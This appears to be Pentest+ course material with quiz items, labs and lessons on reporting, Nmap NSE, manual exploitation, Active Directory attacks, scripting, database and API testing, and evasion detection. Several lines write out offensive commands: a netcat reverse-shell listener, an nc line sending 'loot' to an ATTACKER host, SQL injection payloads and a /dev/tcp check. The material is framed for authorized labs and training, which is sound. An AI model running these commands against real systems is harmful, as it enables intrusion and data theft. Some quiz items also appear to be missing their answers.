blocks.x: The most valuable output of a penetration test is a **clear, prioritized report** with findings, evidence, impact and remediation — not the exploit code or a raw scanner dump. The report is what drives fixes and creates value.
An **executive summary** for non-technical leadership: overall risk, business impact, and key recommendations, in business terms.
Each **technical finding** includes: description, affected assets, **severity**, **evidence** (screenshots, timestamps), **impact**, and a specific, actionable **remediation**.
Findings are **ranked by risk** so the client fixes the most dangerous issues first — prioritisation turns a list into an action plan.
Handle sensitive report data (credentials, exploit detail) securely, sharing only with authorised parties.
Critical, actively exploitable findings should be **communicated promptly** during the engagement, not held until the final report.
**Retesting** after remediation confirms the fixes actually resolved each finding.

A remediation must be specific ("use parameterized queries; least-privilege DB account; input validation"), not vague ("be more secure") — a developer should be able to fix it from your write-up alone.

days.title: Nmap NSE and deep enumeration
days.objective: Master the Nmap Scripting Engine for authorized enumeration.

questions.q: Run the default safe scripts against a host to gather extra detail.
questions.explain: -sC runs the "default" category NSE scripts; safe, informative, authorized targets only.

questions.q: List all HTTP-related NSE scripts available on your system.
questions.explain: NSE scripts live in /usr/share/nmap/scripts/; there are hundreds by category.

questions.q: Enumerate HTTP methods and title on a web host.
questions.explain: Dangerous methods like PUT/DELETE being allowed is a finding.

questions.q: Enumerate SMB shares, users and OS in one command.
questions.explain: Authorized targets only; note anonymous/guest access.

questions.q: Check for anonymous FTP login with NSE.
questions.explain: Anonymous FTP that exposes files is a reportable finding.

questions.q: Which NSE category should you AVOID on fragile production without explicit permission?
questions.explain: Intrusive and dos scripts can disrupt services.

questions.q: What does the -oA flag do?
options: Saves output in all three formats (normal, XML, grepable) with one base name
questions.explain: -oA basename produces basename.nmap/.xml/.gnmap for later parsing and diffing.

questions.q: How do you scan every TCP port, not just the common ones?
questions.explain: -F is fast/fewer ports; -p- is exhaustive but slower.

labs.title: Full NSE enumeration sweep (authorized lab)
labs.scenario: On a lab host, run a service scan with default scripts on all ports, save all output formats, and list the three most interesting findings.
verify: you can name three actionable findings from one scan

labs.title: Targeted NSE per service
labs.scenario: For each open service on a lab host, pick and run the most relevant NSE script and record the result.
verify: each service has an enumeration result recorded

labs.title: Parse scan output
labs.scenario: Turn a saved grepable scan into a clean list of "ip:port service" for the report.
verify: you produced a tidy host/service inventory

labs.title: Build your own recon script
labs.scenario: Write a bash script that takes an IP and runs host discovery, a version scan, and default scripts, saving each stage.
verify: one command produces a staged recon of a host

blocks.x: Nmap's real power for enumeration is the **NSE**, a library of hundreds of scripts organised into categories. On authorised targets:
`-sC` (or `--script=default`) runs the safe default scripts for extra detail.
Category and named scripts target specific services: `--script http-methods,http-title` on web ports, `--script smb-enum-shares,smb-enum-users` on SMB, `--script ftp-anon` to check anonymous FTP.
**Avoid** the `intrusive`/`dos` categories on fragile production without explicit permission — they can disrupt services.
`-oA basename` writes normal, XML and grepable output at once, so you can parse and **diff** scans later (`ndiff scan1.xml scan2.xml` shows what changed).
`-p-` scans all ports; combine a full service+script scan and save everything: `nmap -sS -sV -sC -p- -oA fullscan <ip>`.
Parse grepable output with `awk`/`grep` to build a clean host/service inventory for the report.

Good testers script their recon: a small bash script that takes an IP and runs host discovery, a version scan, and default scripts — saving each stage — turns a repeatable process into one command. NSE plus saved, parseable output is how you enumerate thoroughly and document precisely, which is the foundation for reliable exploitation.

days.title: Manual exploitation and shells
days.objective: Exploit without a framework and manage shells on authorized targets.

questions.q: Start a Netcat listener on port 4444 for a reverse shell (authorized lab).
questions.explain: -l listen, -v verbose, -n no DNS, -p port. Your attacker VM waits for the callback.

questions.q: Connect out from a target to your listener to get a bind/reverse shell (lab).
questions.explain: Authorized lab targets only; -e runs a shell over the connection.

questions.q: Upgrade a dumb shell to a fully interactive TTY (Python method).
questions.explain: Then background with Ctrl+Z and run `stty raw -echo; fg` for a proper TTY.

questions.q: Transfer a file to a target with a simple HTTP server.
questions.explain: On the target: `wget http://ATTACKER:8000/file` or `curl -O ...` (authorized lab).

questions.q: Search Exploit-DB from the command line for a service.
questions.explain: searchsploit indexes Exploit-DB locally; read/verify any PoC before use.

questions.q: Why upgrade a "dumb" shell to a full TTY?
options: To get job control, tab completion, and run interactive tools reliably
questions.explain: A raw shell breaks on interactive prompts and Ctrl+C.

questions.q: A bind shell vs a reverse shell: a reverse shell:
options: Listens on the target for the attacker
Connects from the target back to the attacker (good when inbound is blocked)
questions.explain: Reverse shells traverse many firewalls that block inbound.

questions.q: Before running a public PoC exploit, you should:
options: Read and understand what it does, and test in a lab first
questions.explain: Untrusted exploit code can be destructive or backdoored.

labs.title: Get and stabilize a shell (authorized lab)
labs.scenario: On a vulnerable lab VM, obtain a reverse shell and upgrade it to a full interactive TTY.
steps: # trigger the callback from the lab target (via the vuln)
# Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
verify: you have a stable, interactive shell in the lab

labs.title: File transfer both ways
labs.scenario: Move a file from attacker to target and back, using two different methods.
steps: # back: nc -lvnp 9001 > out.bin (attacker) ; nc ATTACKER 9001 < loot (target)
verify: you moved files in both directions in the lab

labs.title: Find and vet an exploit
labs.scenario: For a known-vulnerable service version, find a candidate exploit and describe how you would vet it before running.
steps: # vet: understand payload/impact, test in an isolated lab, never blind-run
verify: you can explain what the exploit does before running it

labs.title: Manual web exploitation with curl
labs.scenario: Interact with a vulnerable lab endpoint using curl to demonstrate an issue without a browser.
steps: curl -s -X POST -d "q=' OR '1'='1" http://192.168.56.10/search   # SQLi check (lab)
verify: you demonstrated a web flaw purely from the command line

blocks.x: Frameworks are convenient, but a good tester can exploit and manage access with basic tools, which also helps in restricted environments.

**Netcat (nc)** is the "swiss army knife": `nc -lvnp 4444` starts a **listener** on your attacker machine (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port), waiting for a target to connect back for a reverse shell (authorised labs only).
A **reverse shell** connects from the target to your listener — it traverses many firewalls that block inbound — while a **bind shell** listens on the target.
A raw shell breaks on interactive prompts and Ctrl+C. **Upgrade a "dumb" shell to a full TTY** so you get job control, tab completion and reliable interactive tools:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`, then background with Ctrl+Z and run `stty raw -echo; fg` for a proper terminal.
Move files with a quick HTTP server: `python3 -m http.server 8000` on the attacker, then `wget`/`curl` on the target; or use netcat both ways.
`searchsploit <service> <version>` searches the local Exploit-DB copy for a PoC.

Before running any public exploit, **read and understand what it does and test it in a lab** — untrusted exploit code can be destructive or backdoored. You can also drive web exploits purely with `curl`, demonstrating issues like IDOR or SQL injection from the command line.

days.title: Active Directory attacks
days.objective: Test Windows domain security on authorized networks.

questions.q: Active Directory is a high-value target because:
options: Compromising it can grant control over the entire Windows domain
questions.explain: Domain compromise = access to most corporate resources.

questions.q: "Kerberoasting" abuses:
options: Service accounts' Kerberos tickets, which can be cracked offline for their passwords
questions.explain: Use strong, long service-account passwords (or gMSA) to defend.

questions.q: "AS-REP roasting" targets accounts that:
options: Have Kerberos pre-authentication disabled, allowing offline crackable material
questions.explain: Enable pre-authentication; use strong passwords.

questions.q: "BloodHound" is used to:
options: Map AD relationships to find attack paths to Domain Admin
questions.explain: It visualizes who-can-reach-what, exposing privilege paths.

questions.q: "Pass-the-ticket" reuses:
options: Kerberos tickets to authenticate as a user without their password
questions.explain: Ticket hygiene and monitoring help detect it.

questions.q: A "golden ticket" attack forges:
options: A Kerberos TGT using the krbtgt hash, granting broad, persistent domain access
questions.explain: Rotating the krbtgt password (twice) invalidates forged tickets.

questions.q: The strongest AD defenses a tester recommends include:
options: Tiered admin model, LAPS, strong service-account passwords, MFA, and monitoring
questions.explain: Reduce privilege paths and reusable credentials.

questions.q: Why must AD testing stay strictly authorized and scoped?
options: Domain-wide actions can disrupt the whole organization
questions.explain: Coordinate carefully; some techniques are noisy or risky.

questions.q: Enumerate domain users from an authorized AD test host (example tool).
questions.explain: Also: `nmap -p389 --script ldap-search`. Authorized domain targets only.

labs.title: Enumerate an AD lab (authorized)
labs.scenario: On an authorized AD lab, enumerate domain, users, and shares, and note one privilege path idea.
steps: # note a service account (SPN) or a group with excessive rights
verify: you have domain info and a candidate attack path

labs.title: Kerberoast in a lab (concept + steps)
labs.scenario: Describe the Kerberoasting steps against an authorized lab and the remediation.
steps: # request service tickets for accounts with SPNs
# extract the crackable ticket material; crack offline with hashcat/john
# remediation: 25+ char service-account passwords or gMSA; monitor TGS requests
verify: you can explain the attack and give a real fix

labs.title: AD defense recommendations
labs.scenario: List five AD hardening recommendations from your test.
steps: # tiered admin (separate DA accounts, no daily use)
# LAPS for local admin; strong/gMSA service accounts
# MFA on admin + VPN; disable legacy protocols
# monitor for Kerberoasting/DCSync; rotate krbtgt periodically
verify: each maps to an attack technique

labs.title: Map paths with BloodHound (concept)
labs.scenario: Explain what data BloodHound collects and how you would use the graph to reach Domain Admin.
steps: # collects sessions, group memberships, ACLs, trusts
# find shortest path from your foothold user to Domain Admins
# target the weakest edge (e.g., a user who can reset a DA's password)
verify: you can describe reading an attack-path graph

blocks.x: On Windows networks, **Active Directory (AD)** is the crown jewel — compromising it can grant control over the entire domain, and therefore most corporate resources. Testing it stays strictly authorised and scoped, because domain-wide actions can disrupt the whole organisation.
**Kerberoasting** — requesting service accounts' Kerberos tickets and cracking them offline for their passwords; defended with long (25+ char) service-account passwords or gMSA.
**AS-REP roasting** — targeting accounts with Kerberos pre-authentication disabled; enable pre-auth and use strong passwords.
**Pass-the-ticket** — reusing Kerberos tickets to authenticate as a user without their password.
**Golden ticket** — forging a Kerberos TGT using the `krbtgt` hash for broad, persistent access; rotating the `krbtgt` password (twice) invalidates forged tickets.
**BloodHound** collects AD relationships (sessions, group memberships, ACLs, trusts) and graphs the shortest **attack path** to Domain Admin, so you target the weakest edge.
Enumeration tools (`enum4linux`, LDAP queries) reveal domain users, groups and structure.

The AD hardening you recommend: a **tiered admin** model (separate Domain Admin accounts not used daily), **LAPS**, strong/gMSA service accounts, MFA on admin access, disabling legacy protocols, and monitoring for Kerberoasting and DCSync.

days.title: Scripting and automation for testers
days.objective: Automate repetitive tasks safely and efficiently.

questions.q: Loop over a list of IPs and ping each (host discovery script).
accept: for ip in $(cat targets.txt); do ping -c1 -W1 $ip >/dev/null && echo "$ip up"; done
questions.explain: A simple sweep; keep it to in-scope targets only.

questions.q: Extract all IP addresses from a file with grep.
questions.explain: Useful for parsing scan output into a clean target list.

questions.q: Base64-decode a captured string on the command line.
questions.explain: Attackers often encode payloads/data; decoding is routine analysis.

questions.q: URL-encode a payload for a web request (python one-liner).
questions.explain: Handy for crafting web requests by hand.

questions.q: Run a quick port check on a host without nmap (bash /dev/tcp).
questions.explain: A no-tools way to test a single port; authorized targets only.

questions.q: Why automate recon and parsing tasks?
options: Consistency, speed, and fewer manual errors across many targets
questions.explain: Scripts turn a repeatable process into one command.

questions.q: A risk of automation in testing is:
options: A buggy script can hit out-of-scope hosts or cause load at scale
questions.explain: Add scope checks and rate limits; test scripts first.

questions.q: Why keep tooling output structured (JSON/CSV/XML)?
options: It is easy to parse, diff, and feed into the report
questions.explain: Machine-readable output enables automation and comparison.

labs.title: Build a target-parsing pipeline
labs.scenario: From a raw nmap file, extract only hosts with port 445 open into smb_targets.txt.
verify: you have a clean list of SMB hosts to enumerate

labs.title: Write a scoped sweep script
labs.scenario: Write a script that reads targets.txt, refuses any IP not in an allowed CIDR, and version-scans the rest.
steps: # pseudo: for ip in targets; do in_scope $ip && nmap -sV $ip; done
# in_scope checks the IP against the authorized CIDR before scanning

labs.title: Decode and analyze
labs.scenario: Given a base64 + URL-encoded blob from a capture, decode it step by step and describe the content.
verify: you recovered and can describe the original content

labs.title: Automate evidence collection
labs.scenario: Write a script that timestamps and saves the output of id, ss, ps, and sudo -l on a foothold for the report.
steps:
printf '#!/bin/bash
d=$(date +%%F-%%H%%M)
{ date; id; sudo -l; ss -tulpn; ps aux; } > evidence-$d.txt 2>&1
' > collect.sh

blocks.x: Automation brings consistency, speed and fewer errors across many targets — turning a repeatable process into one command. But a buggy script can hit out-of-scope hosts or cause load at scale, so add **scope checks** and rate limits, and test scripts first.
Loop over targets: `for ip in $(cat targets.txt); do ping -c1 -W1 $ip >/dev/null && echo "$ip up"; done`.
Parse output: `grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' scan.txt | sort -u` extracts unique IPs; `awk '/445\/open/{print $2}'` pulls hosts with a port open.
Decode data: `base64 -d` decodes captured strings; a Python one-liner URL-encodes or decodes payloads.
A no-tools port check: `bash -c 'echo > /dev/tcp/host/22 && echo open'`.

Keep tool output **structured** (JSON/CSV/XML) so it's easy to parse, diff and feed into the report. A scoped sweep script should refuse any IP outside the authorised range before scanning. And automate **evidence collection** — a script that timestamps and saves `id`, `ss`, `ps` and `sudo -l` on a foothold captures reproducible proof for the report in one command.

days.title: Attacking databases and APIs
days.objective: Test data stores and web APIs on authorized systems.

questions.q: Connect to a MySQL server with provided lab credentials.
questions.explain: Authorized lab only; weak/default DB creds are a common finding.

questions.q: Test a REST API endpoint with curl and view headers.
questions.explain: -i shows status and headers; look for verbose errors and missing auth.

questions.q: Send a JSON POST to an API endpoint (lab).
questions.explain: Test auth, input handling, and error messages.

questions.q: Enumerate database names once connected (MySQL).
questions.explain: Then SHOW TABLES; and inspect for sensitive data (authorized).

questions.q: An API returning full stack traces on error is a finding because:
options: It leaks internal details useful to an attacker
questions.explain: Recommend generic error messages and proper logging.

questions.q: "Broken object-level authorization" (BOLA/IDOR) in an API means:
options: One user can access another user's objects by changing an ID
questions.explain: Enforce per-request, per-object authorization checks.

questions.q: A missing rate limit on an API login enables:
questions.explain: Recommend rate limiting, lockout, and MFA.

questions.q: Why test for default/weak database credentials?
options: They are a frequent, high-impact way into sensitive data
questions.explain: root with no/weak password is a classic breach path.

labs.title: Test an API for common issues (authorized lab)
labs.scenario: On a lab API, check for missing auth, IDOR, and verbose errors, documenting each result.
verify: you recorded a verdict for auth, IDOR and error handling

labs.title: Assess a database (authorized lab)
labs.scenario: Connect to a lab database, enumerate its contents, and write the findings and fixes.
steps: # SHOW DATABASES; USE app; SHOW TABLES; SELECT * FROM users LIMIT 5;
# findings: weak creds, sensitive data unencrypted at rest
# fixes: strong creds, least-privilege DB accounts, encrypt sensitive columns
verify: you documented DB findings with remediation

labs.title: API hardening recommendations
labs.scenario: List five recommendations after finding missing auth, IDOR, and no rate limit.
steps: # rate limiting + lockout + MFA on sensitive endpoints
# generic error messages; input validation; least-privilege DB user
verify: each fixes a specific observed issue

labs.title: SQL injection deep dive (lab)
labs.scenario: On a deliberately vulnerable lab app, demonstrate extracting a table name via injection, then write the parameterized-query fix.
steps: # in a lab input:  ' UNION SELECT table_name,2 FROM information_schema.tables-- -
# confirm you can read schema; screenshot
# fix: prepared statements; least-privilege DB account; input validation
verify: you demonstrated SQLi impact and gave the correct fix

blocks.x: Databases and APIs hold the data attackers ultimately want, so they get focused testing on authorised systems.
**Weak or default database credentials** (e.g. `root` with no/weak password) are a frequent, high-impact way in — connect with the DB client and enumerate contents (`SHOW DATABASES;`).
**SQL injection** can extract schema and data — e.g. a `UNION SELECT` against `information_schema` reveals table names; the fix is always parameterized queries plus a least-privilege DB account.
**Missing authentication** — endpoints that return data without requiring a login.
**Broken object-level authorization (BOLA/IDOR)** — changing an ID lets one user access another's objects; enforce per-object authorization server-side.
**Verbose errors** — full stack traces leak internal details; return generic messages.
**No rate limiting** — enables brute-force and credential stuffing; add rate limiting, lockout and MFA.
Interact with APIs using `curl` (`-i` to see headers and status, `-X POST` with a JSON body), checking auth, input handling and error verbosity.

The remediations tie together: require authentication and per-object authorization, rate-limit sensitive endpoints, return generic errors, validate input, use parameterized queries, and run the database under a least-privilege account. Each recommendation maps directly to an observed weakness so developers can act on it.

days.title: Evasion awareness and detection
days.objective: Understand evasion so you can test and improve detection (purple-team).

questions.q: In an authorized test, understanding evasion helps you:
options: Assess how well the client detects and responds, and recommend improvements
questions.explain: The goal is better detection, not undetectable attacks.

questions.q: Why do attackers "live off the land" (LOLBins)?
options: Using built-in tools avoids dropping detectable malware files
questions.explain: Monitor for abnormal use of legit tools (e.g., PowerShell, certutil).

questions.q: "Timestomping" refers to:
options: Altering file timestamps to hinder forensic analysis
questions.explain: Defenders compare multiple timestamps and central logs to catch it.

questions.q: Encoding/obfuscating a payload aims to:
questions.explain: Behavior-based detection (EDR) is harder to evade than signatures.

questions.q: From a purple-team view, when a technique is NOT detected you should:
options: Report the detection gap so the client can add monitoring
questions.explain: Undetected TTPs are exactly what the client needs to know.

questions.q: Why do attackers clear or tamper with logs?
options: To hide their activity and slow response
questions.explain: Recommend centralized, immutable/off-host logging.

questions.q: "Beaconing" traffic to C2 is detectable by:
options: Regular, periodic connections to an unusual destination
questions.explain: Flow analysis and threat intel catch beacon patterns.

questions.q: The best defensive recommendation after testing evasion is often:
options: Centralized logging + EDR + behavior analytics + alert tuning
questions.explain: Detection depth matters more than any single tool.

labs.title: Purple-team detection map
labs.scenario: For three techniques you used (LOLBins, log tampering, beaconing), write the detection the client should have.
steps: # LOLBins -> EDR command-line + parent/child process alerts
# log tampering -> central/immutable logs + integrity monitoring
verify: each technique has a concrete detection

labs.title: Test whether actions alert (lab)
labs.scenario: In a monitored lab, run a noisy action and a quiet action; note which triggered detection.
steps: # noisy: full port scan of a host
# quiet: single connection to one service
# check the lab SIEM/EDR for which generated an alert
verify: you can state the detection gap

labs.title: Recommend logging improvements
labs.scenario: After finding local logs were tamperable, write the logging recommendations.
steps: # forward logs off-host in real time (central SIEM)
# make local logs append-only/immutable where possible
# alert on log-clearing events; sync time via NTP
verify: an attacker can no longer quietly erase evidence

blocks.x: In an authorised test, understanding evasion helps you assess how well the client **detects and responds** — the goal is better detection, not staying permanently hidden. This is the purple-team purpose.
Attackers **live off the land** (LOLBins), using built-in tools like PowerShell or `certutil` to avoid dropping detectable malware.
**Timestomping** alters file timestamps to hinder forensics.
**Obfuscating/encoding** payloads evades signature-based detection — but behaviour-based **EDR** is harder to evade.
**Beaconing** to command-and-control shows up as regular, periodic connections to an unusual destination.
When a technique is **not** detected, you report the **detection gap** so the client can add monitoring. For each technique you tested, give the detection the client should have:
LOLBins → EDR command-line and parent/child process alerts.
Log tampering → central/immutable logs plus integrity monitoring; alert on log-clearing events.
Beaconing → NetFlow analysis and threat-intel matching.

The best defensive recommendation is depth: **centralized logging + EDR + behaviour analytics + tuned alerts**. Detection depth matters more than any single tool, and forwarding logs off-host in real time stops an attacker quietly erasing evidence.

blocks.x: A tester should know the core toolkit, what each tool does, and its basic syntax, so you reach for the right one instantly:
**nmap** — network/service discovery (`nmap -sV <target>`).
**gobuster / ffuf** — web content discovery and fuzzing (`gobuster dir -u http://<t> -w <wordlist>`; `ffuf -u http://<t>/FUZZ -w <wordlist>`).
**hashcat / John the Ripper** — offline hash cracking (`hashcat -m 0 hashes.txt <wordlist>` where `-m` picks the hash type).
**Burp Suite / OWASP ZAP** — intercept and modify web traffic.
**Wireshark / tcpdump** — capture and analyse packets.
**BloodHound** — map Active Directory attack paths.
**searchsploit** — search the local Exploit-DB.

Real work chains tools together: `nmap` finds an open web port → `gobuster` discovers a hidden endpoint → `curl` interacts with that specific vulnerable endpoint. Keeping a **personal cheat sheet** of your ten most-used commands, with a one-line note each, means you can recall them under time pressure — which matters both on the job and on the exam's performance-based questions.

blocks.x: The Pentest+ exam includes **performance-based questions (PBQs)** that require you to analyse tool output, choose or complete commands, or work through a scenario — so hands-on command familiarity is exactly what wins points. As with any timed exam, **flag** the slow PBQs, secure the quick multiple-choice points first, then return.
When asked for the **NEXT step** in a methodology, choose the one that logically follows the phase order — you *enumerate before you exploit*, and you *report at the end*.
When given **tool output**, read it carefully and pick the action it actually supports.
The professional's first consideration in any scenario is **scope and authorisation** — that instinct is almost always the right answer.
When two exploits both work, the safest choice is the **lower-impact** one that proves the risk without disrupting the target.

Every engagement — and the exam — comes back to a clear, prioritised **report** with evidence and remediation, which is what creates value for the client. Combine that with the phase order, the right tool for each task, and an unwavering commitment to staying in scope and doing no harm, and you have the mindset the certification is really testing. Practising the labs and command drills alongside this theory is what builds the hands-on confidence the PBQs reward.
